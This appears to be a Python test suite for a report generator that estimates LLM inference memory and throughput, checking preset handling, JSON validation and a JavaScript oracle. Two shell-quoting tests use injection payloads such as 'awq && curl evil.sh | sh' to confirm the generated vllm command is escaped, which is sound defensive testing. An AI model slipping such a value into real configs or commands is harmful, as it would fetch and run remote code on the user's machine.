#!/usr/bin/env python3
"""Verify generate_report.py's cfg builders carry a preset's full architecture
into compute() — and that they do it by construction, not by naming fields.

parity.test.py extracts compute() with an AST trick that keeps reportlab out of
scope — but it cherry-picks a handful of top-level nodes and re-execs them with
only `math` in scope, so it cannot see from_json(), from_cli_args(), or
interactive_mode() at all. That blind spot is exactly how attn/swa_win/
swa_local/mla_dim, and separately max_ctx, went missing from every cfg
builder's key whitelist while compute() itself already handled them correctly:
nothing ever exercised the builders against PRESETS. This suite imports
generate_report as a real module instead, so it sees what the builders
actually return.

Checked:
  1. For every PRESETS entry, from_cli_args()/from_json()/interactive_mode()
     — including the actual computed numbers for interactive_mode, not just
     which keys arrive — must make compute() behave identically to
     arch_fields() applied to that preset directly. Not a hand-written second
     copy of what PRESETS should produce: that's itself a whitelist that
     silently stops covering a field the moment PRESETS gains one this file
     was never told about.
  2. Independently of arch_fields() entirely: Python's compute() must match
     index.html's computeInference(), driven by index.html's own MODEL_PRESETS
     table (extracted from source, not re-derived) — the JS engine as oracle.
  3. A field neither this file nor compute() has ever heard of still reaches
     cfg through every builder that starts from a preset, because those
     builders forward a preset's fields by default rather than by name.
  4. An explicit value in a JSON config wins over the preset it also selects,
     for architecture fields exactly as it already does for ctx/kv_bpp/etc —
     specifically checked in the vulnerable direction: a preset that defines
     NO swa/mla keys of its own, overridden into swa/mla, must still produce
     real non-zero KV — not attn flipped with the parameter that gives it
     meaning silently dropped, which is what "override restricted to keys
     the preset already defines" actually did.
  5. A wrong-typed value from raw JSON fails loudly and names the offending
     key, instead of crashing anonymously deep inside compute() (or worse,
     computing a confident wrong answer).
  6. hf_model/quant, both reachable from raw JSON, cannot inject shell syntax
     into the copy-pasteable vllm serve command.

Run:  python3 tests/report.test.py
"""
import contextlib
import io
import json
import os
import subprocess
import sys
import tempfile
import types
import unittest.mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import generate_report as gr

pass_ct = fail_ct = 0

def test(name, fn):
    global pass_ct, fail_ct
    try:
        fn()
        print(f"  ok   {name}")
        pass_ct += 1
    except Exception as e:
        # Broad on purpose: a dropped key can surface as KeyError rather than
        # AssertionError, and that must be reported, not crash the suite
        # before every preset gets a chance to run.
        print(f"  FAIL {name}\n       {type(e).__name__}: {e}")
        fail_ct += 1


def dict_diff(got, want):
    """Field-by-field diff between two compute() outputs, for failure messages."""
    lines = []
    for k in sorted(set(got) | set(want)):
        if got.get(k) != want.get(k):
            lines.append(f"{k}: builder={got.get(k)!r} expected={want.get(k)!r}")
    return lines


def assert_match(got, want, label):
    diff = dict_diff(got, want)
    assert not diff, f"{label} disagrees with the hand-built architecture:\n       " + "\n       ".join(diff)


def write_json(obj):
    fd, path = tempfile.mkstemp(suffix=".json")
    with os.fdopen(fd, "w") as f:
        json.dump(obj, f)
    return path


# ---- shared request parameters, held constant so only architecture varies ----
# ctx must clear every preset's swa_win (max is llama4-109b's 8192) — otherwise
# a SWA preset's local layers never actually hit their cap within this context,
# and standard vs. swa produce the same KV size by coincidence, masking exactly
# the bug this suite exists to catch.
REQ = {"gpu": "h100-80", "ctx": 16384, "conc": 4, "n_gpu": 1, "nvlink": True, "kv_bpp": 2}
BPP = 0.5  # awq, in both from_cli_args (via --prec) and from_json (via "bpp")


def expected_cfg(pd):
    """A cfg built from PRESETS' own translation (arch_fields) plus the fixed
    request parameters above — deliberately NOT a hand-written second copy of
    the field list. A hand-written 'expected' dict is itself a parallel
    whitelist: it silently stops covering a field the moment one is added to
    PRESETS but not mirrored here, which is the exact failure mode this suite
    exists to catch, just moved into the test instead of the product. The
    JS-oracle check below provides independent ground truth that doesn't go
    through arch_fields() at all, so this isn't circular — it verifies the
    builders route through arch_fields() and merge the request fields without
    dropping or clobbering anything, which a hand-copied dict can't tell you
    once arch_fields() is the single source of truth for both sides.
    """
    cfg = gr.arch_fields(pd)
    cfg.update({
        "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"], "n_gpu": REQ["n_gpu"],
        "gpu": gr.GPUS[REQ["gpu"]], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    return cfg


def cli_args_for(preset_key):
    return types.SimpleNamespace(
        preset=preset_key, gpu=REQ["gpu"], prec="awq", ctx=REQ["ctx"],
        conc=REQ["conc"], ngpu=REQ["n_gpu"], no_nvlink=not REQ["nvlink"],
        fp8_kv=REQ["kv_bpp"] == 1,
    )


def run_interactive_with_preset(preset_key):
    """Drive interactive_mode() end to end via mocked stdin, selecting
    preset_key and the shared request parameters. Exercises the real function
    — the no-args default path a first-time user hits — not a stand-in for
    it. n_gpu=1 below means nvlink's value never reaches compute() (it only
    affects multi-GPU overhead/penalty), so answering it "1" here doesn't
    diverge from REQ["nvlink"]=True used everywhere else."""
    preset_idx = list(gr.PRESETS.keys()).index(preset_key) + 1
    gpu_idx = list(gr.GPUS.keys()).index(REQ["gpu"]) + 1
    answers = [
        str(preset_idx),   # "Select preset number (or 'custom')"
        str(gpu_idx),      # "Select GPU number"
        "1",                # "GPU count [1]" — 1 GPU, so the NVLink prompt is never asked
        "3",                # "Select [3]" precision -> INT4/AWQ
        "n",                # "FP8 KV cache? [y/n, default n]"
        str(REQ["ctx"]),   # "Context length [8192]"
        str(REQ["conc"]),  # "Concurrent requests [1]"
    ]
    with unittest.mock.patch("builtins.input", side_effect=answers), \
         contextlib.redirect_stdout(io.StringIO()):
        return gr.interactive_mode()


print("\nPreset architecture reaches compute() (from_cli_args / from_json / interactive_mode vs. arch_fields)")
for key, pd in gr.PRESETS.items():
    want = gr.compute(expected_cfg(pd))

    def check_cli(key=key, want=want):
        got = gr.compute(gr.from_cli_args(cli_args_for(key)))
        assert_match(got, want, "from_cli_args")
    test(f"{key}: from_cli_args carries full architecture into compute()", check_cli)

    def check_json(key=key, want=want):
        path = write_json({
            "preset": key, "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
            "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
            "kv_bpp": REQ["kv_bpp"],
        })
        try:
            got = gr.compute(gr.from_json(path))
        finally:
            os.remove(path)
        assert_match(got, want, "from_json")
    test(f"{key}: from_json carries full architecture into compute()", check_json)

    def check_interactive(key=key, want=want):
        # Numbers, not just key routing (routing alone is the separate
        # property test further down). A corrupted interactive_mode that,
        # say, silently halved h_dim would still route every key through
        # fine and only show up here, in what compute() does with the value.
        got = gr.compute(run_interactive_with_preset(key))
        assert_match(got, want, "interactive_mode")
    test(f"{key}: interactive_mode carries full architecture into compute()", check_interactive)


# ---- JS engine as oracle ---------------------------------------------------
# Runs index.html's OWN MODEL_PRESETS table (not Python's PRESETS, not
# arch_fields — an entirely separate extraction) through its OWN
# computeInference(), the same way applyPreset() + buildState() would for a
# user selecting that preset in the browser. This is independent ground
# truth: it cannot be fooled by a bug in arch_fields() itself, only by the two
# engines genuinely disagreeing.
JS_ORACLE_RUNNER = r"""
const fs=require('fs');
const html=fs.readFileSync(process.argv[1],'utf8');
const gib=html.match(/^const GIB = .+;$/m)[0];
const perf=html.match(/^const PERF = \{[\s\S]*?\n\};$/m)[0];
const mp=html.match(/^const MODEL_PRESETS = \{[\s\S]*?\n\};$/m)[0];
const s=html.indexOf('function computeInference(state) {'), e=html.indexOf('\n}\n',s);
const scope=new Function(`${gib}\n${perf}\n${mp}\n${html.slice(s,e+2)}; return {computeInference, MODEL_PRESETS};`)();
const gt=html.match(/^const GPU_TABLE = \{[\s\S]*?\n\};$/m);
if(!gt) throw new Error('GPU_TABLE not found in index.html');
const GPU_TABLE=new Function(`${gt[0]}; return GPU_TABLE;`)();
const G={};
for(const g of Object.values(GPU_TABLE)){
  G[g.name.replace(/ GB$/,'GB')]={gb:g.gb,bw:g.bw,h:g.hyper,sp:g.spec,st:g.spot,tf:g.tflops};
}
const req=JSON.parse(process.argv[2]);
const g=G[req.gpuName];
const out={};
for (const key of Object.keys(scope.MODEL_PRESETS)) {
  const p=scope.MODEL_PRESETS[key];
  out[key]=scope.computeInference({
    params:p.p, activePercent:p.a, bytesPerParam:req.bpp, layers:p.l,
    kvHeads:p.kv, headDim:p.hd, sharedExperts:p.se||0,
    contextLength:req.ctx, concurrency:req.conc, gpuCount:req.n_gpu,
    hasNVLink:req.nvlink, kvBytesPerValue:req.kv_bpp,
    gpuGB:g.gb, gpuBandwidth:g.bw, gpuTFLOPS:g.tf, gpuHyperCost:g.h,
    gpuSpecCost:g.sp, gpuSpotCost:g.st, gpuName:req.gpuName,
    attnMode:p.attn||'standard', swaWindow:p.swaWin||0,
    swaLocalLayers:p.swaLocal||0, mlaLatentDim:p.mlaDim||0,
    modelMaxCtx:p.maxCtx||131072,
  });
}
console.log(JSON.stringify(out));
"""

# Derived from the generated table, not hand-maintained. index.html's getGpuSpec()
# strips the space out of "H100 80 GB" before handing the name to computeInference();
# mirror that so the oracle runner's lookup keys match.
def display_name(slug):
    return gr.GPUS[slug]["name"].replace(" GB", "GB")

# Same field mapping parity.test.py uses — duplicated rather than imported,
# consistent with every test file here being runnable and readable on its own.
JS_FIELDS = [
    ("weights_gb", "weightsGB", 0.01), ("kv_gb", "kvCacheGB", 0.01),
    ("act_gb", "activationsGB", 0.01), ("total_gb", "totalGB", 0.01),
    ("per_total", "perGPU.total", 0.01), ("free_kv", "freeForKVCache", 0.01),
    ("max_ctx_1", "maxContextSingleUser", 1), ("max_conc_8k", "maxConcurrentAt8K", 1),
    ("single_tok", "singleStreamTokS", 1), ("agg_tok", "aggregateTokS", 1),
    ("agg_obs_lo", "aggregateObservedLoTokS", 1), ("agg_obs_hi", "aggregateObservedHiTokS", 1),
    ("per_user_load", "perUserAtLoadTokS", 1), ("eff_batch", "effectiveBatch", 0),
    ("max_batch_kv", "maxBatchByKV", 0), ("ttft_ms", "ttftMs", 1),
    ("sat_batch", "saturatedBatch", 0), ("sat_tok", "saturatedTokS", 1),
    ("kv_saved_by_prefix_gb", "kvSavedByPrefixGB", 0.01),
]
js_dig = lambda d, p: d["perGPU"]["total"] if p == "perGPU.total" else d[p]

print("\nJS engine as oracle (index.html's own MODEL_PRESETS + computeInference)")
req_for_js = dict(REQ, bpp=BPP, gpuName=display_name(REQ["gpu"]))
proc = subprocess.run(
    ["node", "-e", JS_ORACLE_RUNNER, os.path.join(ROOT, "index.html"), json.dumps(req_for_js)],
    capture_output=True, text=True)
js_oracle = {}
if proc.returncode:
    print("  FAIL node runner failed:\n       " + proc.stderr.replace("\n", "\n       "))
    fail_ct += 1
else:
    js_oracle = json.loads(proc.stdout)

for key in gr.PRESETS:
    def check_js_oracle(key=key):
        js = js_oracle[key]
        py = gr.compute(gr.from_cli_args(cli_args_for(key)))
        bad = []
        for pk, jk, tol in JS_FIELDS:
            a, b = py[pk], js_dig(js, jk)
            if abs(a - b) > max(tol, abs(b) * 0.001):
                bad.append(f"{pk}: py={a:.6g} js={b:.6g}")
        assert not bad, "compute() vs. index.html's computeInference():\n       " + "\n       ".join(bad)
    test(f"{key}: matches the JS engine driven by index.html's own MODEL_PRESETS", check_js_oracle)


print("\nfrom_json raw (non-preset) branch")

def check_raw_defaults_to_standard():
    # An existing JSON config with no attention keys at all must keep behaving
    # exactly as it did before this fix: standard attention.
    path = write_json({
        "params": 8, "layers": 32, "kv_heads": 8, "h_dim": 128,
        "ctx": 8192, "conc": 4, "n_gpu": 1, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn", "standard") == "standard", f"attn defaulted to {cfg.get('attn')!r}"
    assert cfg.get("swa_win", 0) == 0 and cfg.get("swa_local", 0) == 0 and cfg.get("mla_dim", 0) == 0
    explicit_standard = dict(cfg, attn="standard", swa_win=0, swa_local=0, mla_dim=0)
    assert_match(gr.compute(cfg), gr.compute(explicit_standard), "raw cfg vs. explicit-standard cfg")

test("a raw JSON config with no attention keys still gets standard attention", check_raw_defaults_to_standard)


def check_raw_swa_override_is_honored():
    path = write_json({
        "params": 26, "layers": 30, "kv_heads": 8, "h_dim": 256,
        "attn": "swa", "swa_win": 1024, "swa_local": 25,
        "ctx": 32768, "conc": 8, "n_gpu": 1, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn") == "swa" and cfg.get("swa_win") == 1024 and cfg.get("swa_local") == 25, \
        f"attention keys not carried through from raw JSON: {cfg}"
    swa_kv = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    # SWA caps most layers' KV at the window; at this context it must cost
    # strictly less than paying full standard attention for all 30 layers.
    assert swa_kv < standard_kv, f"swa_kv={swa_kv} standard_kv={standard_kv} — SWA had no effect"

test("a raw JSON config's explicit swa attention keys are carried into compute()",
     check_raw_swa_override_is_honored)


def check_raw_mla_override_is_honored():
    path = write_json({
        "params": 671, "layers": 61, "kv_heads": 128, "h_dim": 56, "shared_exp": 1,
        "attn": "mla", "mla_dim": 576,
        "ctx": 16384, "conc": 8, "n_gpu": 8, "gpu": "h100-80",
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("attn") == "mla" and cfg.get("mla_dim") == 576, \
        f"attention keys not carried through from raw JSON: {cfg}"
    mla_kv = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    assert mla_kv < standard_kv, f"mla_kv={mla_kv} standard_kv={standard_kv} — MLA had no effect"

test("a raw JSON config's explicit mla attention keys are carried into compute()",
     check_raw_mla_override_is_honored)


print("\nfrom_json: explicit JSON values override the selected preset's")

def check_preset_branch_raw_override_wins():
    # A JSON that selects a preset but also sets one of its architecture
    # fields explicitly must honor the explicit value — the same rule ctx and
    # kv_bpp already follow in this same branch. gemma4-31b is swa; forcing
    # attn back to standard makes the divergence impossible to paper over
    # with a coincidental match.
    path = write_json({
        "preset": "gemma4-31b", "attn": "standard", "gpu": REQ["gpu"],
        "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"], "n_gpu": REQ["n_gpu"],
        "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["attn"] == "standard", f"explicit JSON override lost to the preset: attn={cfg['attn']!r}"
    # Everything the JSON didn't override still comes from the preset.
    assert cfg["layers"] == gr.PRESETS["gemma4-31b"]["l"]
    assert cfg["max_ctx"] == gr.PRESETS["gemma4-31b"]["max_ctx"]

test("from_json: an explicit attn in the JSON overrides the selected preset's",
     check_preset_branch_raw_override_wins)


def check_preset_branch_honors_hf_model_override():
    # This tool's origin story is an air-gapped deployment: "pick a preset,
    # point it at my local weights" is the obvious thing to write in a
    # config. hf_model/model_name are set unconditionally by the request
    # layer below the override merge, so it's not enough for them to survive
    # the merge — they must actually win over the preset's own value there.
    path = write_json({
        "preset": "llama31-8b", "hf_model": "/opt/models/my-local-copy",
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["hf_model"] == "/opt/models/my-local-copy", \
        f"hf_model override lost to the preset: {cfg['hf_model']!r}"
    cmd = gr.build_vllm_cmd(cfg, gr.compute(cfg))
    assert "vllm serve /opt/models/my-local-copy \\" in cmd, \
        f"the emitted command still points at the network model id, not the local path:\n{cmd}"

test("from_json: an explicit hf_model in the JSON overrides the selected preset's",
     check_preset_branch_honors_hf_model_override)


def check_preset_branch_honors_model_name_override():
    path = write_json({
        "preset": "llama31-8b", "model_name": "My Local 8B",
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg["model_name"] == "My Local 8B", \
        f"model_name override lost to the preset: {cfg['model_name']!r}"

test("from_json: an explicit model_name in the JSON overrides the selected preset's",
     check_preset_branch_honors_model_name_override)


def check_standard_preset_overridden_to_swa_gets_real_kv():
    # The vulnerable direction: llama31-8b defines no SWA keys at all, so
    # arch_fields(pd) never puts swa_win/swa_local in cfg to begin with. An
    # override merge restricted to "keys the preset already defines" — the
    # previous, broken version of this — let attn flip to swa while silently
    # dropping the window and local-layer count. That is not "override
    # ignored", it is "override half-applied": every local layer's KV comes
    # out empty instead of the requested number.
    path = write_json({
        "preset": "llama31-8b", "attn": "swa", "swa_win": 4096, "swa_local": 16,
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("swa_win") == 4096 and cfg.get("swa_local") == 16, \
        f"swa_win/swa_local dropped by the override merge: {cfg}"
    kv_gb = gr.compute(cfg)["kv_gb"]
    standard_kv = gr.compute(dict(cfg, attn="standard"))["kv_gb"]
    assert kv_gb > 0, f"kv_gb={kv_gb} — swa_win/swa_local were dropped, so every local layer's KV is empty"
    assert kv_gb < standard_kv, f"swa_kv={kv_gb} standard_kv={standard_kv} — SWA had no effect"

test("from_json: llama31-8b (defines no swa keys) overridden to swa gets a real, non-zero KV cache",
     check_standard_preset_overridden_to_swa_gets_real_kv)


def check_standard_preset_overridden_to_mla_gets_real_kv():
    # Same vulnerability, mla direction — this is the exact N1 regression:
    # attn flipped to mla while mla_dim silently stayed absent, computing a
    # confident kv_gb of 0.0 and fits=True instead of the requested number.
    path = write_json({
        "preset": "llama31-8b", "attn": "mla", "mla_dim": 576,
        "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"], "conc": REQ["conc"],
        "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"], "kv_bpp": REQ["kv_bpp"],
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("mla_dim") == 576, f"mla_dim dropped by the override merge: {cfg}"
    kv_gb = gr.compute(cfg)["kv_gb"]
    assert kv_gb > 0, f"kv_gb={kv_gb} — mla_dim was dropped, exactly the N1 regression"

test("from_json: llama31-8b (defines no mla keys) overridden to mla gets a real, non-zero KV cache",
     check_standard_preset_overridden_to_mla_gets_real_kv)


def check_preset_branch_honors_runtime_overrides():
    # shared_prefix/prefix_caching are never defined by any preset, so the
    # old "only keys the preset defines" filter dropped them here while the
    # raw (non-preset) branch already honoured them via dict(raw) — the same
    # inconsistency as the attn override, for a different field class.
    path = write_json({
        "preset": "llama31-8b", "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
        "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
        "kv_bpp": REQ["kv_bpp"], "shared_prefix": 4096, "prefix_caching": True,
    })
    try:
        cfg = gr.from_json(path)
    finally:
        os.remove(path)
    assert cfg.get("shared_prefix") == 4096, f"shared_prefix dropped by the preset path: {cfg}"
    assert cfg.get("prefix_caching") is True, f"prefix_caching dropped by the preset path: {cfg}"

test("from_json: shared_prefix/prefix_caching reach cfg through the preset path too",
     check_preset_branch_honors_runtime_overrides)


print("\nMalformed raw JSON fails loudly and names the offending key")

def assert_raises_naming(fn, exc_type, needle):
    """Call fn() and require it to raise exc_type with needle in the message
    — proves a bad value fails loudly and names the key, instead of crashing
    anonymously deep inside compute() or, worse, silently computing zero."""
    try:
        result = fn()
    except exc_type as e:
        assert needle in str(e), f"{exc_type.__name__} raised but doesn't mention {needle!r}: {e}"
        return
    raise AssertionError(f"expected {exc_type.__name__} mentioning {needle!r}, got a normal return: {result!r}")


def check_bad_max_ctx_type_fails_clearly():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "max_ctx": "lots", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "max_ctx")
    finally:
        os.remove(path)

test("a non-numeric max_ctx in raw JSON raises a clear, key-named error",
     check_bad_max_ctx_type_fails_clearly)


def check_bad_swa_local_type_fails_clearly():
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8, "attn": "swa",
                        "swa_local": "many", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_local")
    finally:
        os.remove(path)

test("a non-numeric swa_local in raw JSON raises a clear, key-named error",
     check_bad_swa_local_type_fails_clearly)


def check_bad_preset_override_type_fails_clearly():
    # Same validation applies to the preset-branch override merge, not just
    # the raw (non-preset) branch.
    path = write_json({"preset": "llama31-8b", "attn": "mla", "mla_dim": "bad", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "mla_dim")
    finally:
        os.remove(path)

test("a non-numeric architecture override on a preset-selecting JSON raises a clear, key-named error",
     check_bad_preset_override_type_fails_clearly)


def check_prefix_caching_accepts_bool_and_0_1():
    # JSON authors routinely write 1/0 for booleans. isinstance(1, bool) is
    # False, so a naive isinstance() check rejects the reasonable input.
    for val in (0, 1, False, True):
        path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                            "prefix_caching": val, "gpu": "h100-80"})
        try:
            cfg = gr.from_json(path)  # must not raise
        finally:
            os.remove(path)
        assert cfg.get("prefix_caching") == val, f"prefix_caching={val!r} was not preserved: {cfg}"

test("prefix_caching accepts 0/1 as well as true/false", check_prefix_caching_accepts_bool_and_0_1)


def check_nonsensical_prefix_caching_value_still_rejected():
    # Widening to accept 0/1 must not widen all the way to "anything".
    path = write_json({"params": 8, "layers": 32, "kv_heads": 8,
                        "prefix_caching": 2, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "prefix_caching")
    finally:
        os.remove(path)

test("a prefix_caching value that isn't 0/1/bool is still rejected",
     check_nonsensical_prefix_caching_value_still_rejected)


def check_bool_rejected_for_a_numeric_field():
    # isinstance(True, int) is True in Python — a stray boolean must not
    # silently pass as a valid layer count.
    path = write_json({"params": 8, "layers": True, "kv_heads": 8, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "layers")
    finally:
        os.remove(path)

test("a bool value for a numeric field like layers is rejected, not silently accepted as 1",
     check_bool_rejected_for_a_numeric_field)


def check_mla_without_mla_dim_is_rejected():
    # Nothing is being dropped here — the user under-specified — but the
    # symptom is identical to the N1 bug: attn='mla' with mla_dim absent
    # computes kv_gb=0.0 and fits=True instead of a real number.
    path = write_json({"preset": "llama31-8b", "attn": "mla", "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "mla_dim")
    finally:
        os.remove(path)

test("attn='mla' without mla_dim is rejected instead of silently computing kv_gb=0",
     check_mla_without_mla_dim_is_rejected)


def check_swa_without_window_is_rejected():
    path = write_json({"preset": "llama31-8b", "attn": "swa", "swa_local": 16, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_win")
    finally:
        os.remove(path)

test("attn='swa' without swa_win is rejected instead of silently computing kv_gb=0",
     check_swa_without_window_is_rejected)


def check_swa_without_local_layers_is_rejected():
    path = write_json({"preset": "llama31-8b", "attn": "swa", "swa_win": 4096, "gpu": "h100-80"})
    try:
        assert_raises_naming(lambda: gr.from_json(path), TypeError, "swa_local")
    finally:
        os.remove(path)

test("attn='swa' without swa_local is rejected instead of silently computing kv_gb=0",
     check_swa_without_local_layers_is_rejected)


print("\nvLLM command interpolation is shell-safe")

def check_quant_is_shell_quoted():
    # quant now reaches build_vllm_cmd() from raw JSON via the default-allow
    # override path — the same class of exposure hf_model already had, but
    # newly reachable for quant since the arch_fields rewrite.
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
               n_gpu=1, ctx=8192, conc=1, bpp=0.5, quant="awq && curl evil.sh | sh")
    comp = gr.compute(cfg)
    assert comp["fits"], "test fixture doesn't fit — command would short-circuit before quant is even rendered"
    cmd = gr.build_vllm_cmd(cfg, comp)
    assert "--quantization 'awq && curl evil.sh | sh' \\" in cmd, f"quant was not shell-quoted:\n{cmd}"

test("a malicious quant value is shell-quoted in the generated command, not interpolated raw",
     check_quant_is_shell_quoted)


def check_hf_model_is_shell_quoted():
    cfg = dict(gr.arch_fields(gr.PRESETS["llama31-8b"]), gpu=gr.GPUS["h100-80"],
               n_gpu=1, ctx=8192, conc=1, bpp=0.5, hf_model="foo && curl evil.sh | sh")
    comp = gr.compute(cfg)
    assert comp["fits"], "test fixture doesn't fit — command would short-circuit before hf_model is even rendered"
    cmd = gr.build_vllm_cmd(cfg, comp)
    assert "vllm serve 'foo && curl evil.sh | sh' \\" in cmd, f"hf_model was not shell-quoted:\n{cmd}"

test("a malicious hf_model value is shell-quoted in the generated command, not interpolated raw",
     check_hf_model_is_shell_quoted)


def check_ordinary_values_are_not_needlessly_quoted():
    # shlex.quote() must be invisible for the common case — no stray quotes
    # around a plain HuggingFace id or quant name that never needed escaping.
    cfg = gr.from_cli_args(cli_args_for("llama31-8b"))
    cmd = gr.build_vllm_cmd(cfg, gr.compute(cfg))
    assert "vllm serve meta-llama/Llama-3.1-8B-Instruct \\" in cmd, \
        f"an ordinary HF model id got quoted unnecessarily:\n{cmd}"
    assert "--quantization awq \\" in cmd, f"an ordinary quant value got quoted unnecessarily:\n{cmd}"

test("ordinary hf_model/quant values render unquoted, exactly as before",
     check_ordinary_values_are_not_needlessly_quoted)


print("\nDefault-allow property (a field neither compute() nor this file has heard of)")

def check_unrecognised_field_reaches_every_builder():
    # The exact scenario this round exists to prevent: a field added to
    # PRESETS that compute() doesn't read yet, or reads under a name nothing
    # in this file has been told about. If any builder still needs to be
    # taught this key's name before forwarding it, this fails — that is the
    # entire difference between default-allow and a whitelist with one more
    # entry in it.
    key = "llama31-8b"
    original = dict(gr.PRESETS[key])
    gr.PRESETS[key] = dict(original, attn_sink=4)
    try:
        cli_cfg = gr.from_cli_args(cli_args_for(key))
        assert cli_cfg.get("attn_sink") == 4, f"from_cli_args dropped attn_sink: {cli_cfg}"

        path = write_json({
            "preset": key, "gpu": REQ["gpu"], "bpp": BPP, "ctx": REQ["ctx"],
            "conc": REQ["conc"], "n_gpu": REQ["n_gpu"], "nvlink": REQ["nvlink"],
            "kv_bpp": REQ["kv_bpp"],
        })
        try:
            json_cfg = gr.from_json(path)
        finally:
            os.remove(path)
        assert json_cfg.get("attn_sink") == 4, f"from_json dropped attn_sink: {json_cfg}"

        interactive_cfg = run_interactive_with_preset(key)
        assert interactive_cfg.get("attn_sink") == 4, f"interactive_mode dropped attn_sink: {interactive_cfg}"
    finally:
        gr.PRESETS[key] = original

test("a PRESETS field compute() has never heard of still reaches cfg through every builder",
     check_unrecognised_field_reaches_every_builder)


print(f"\n{pass_ct} passed, {fail_ct} failed\n")
sys.exit(1 if fail_ct else 0)
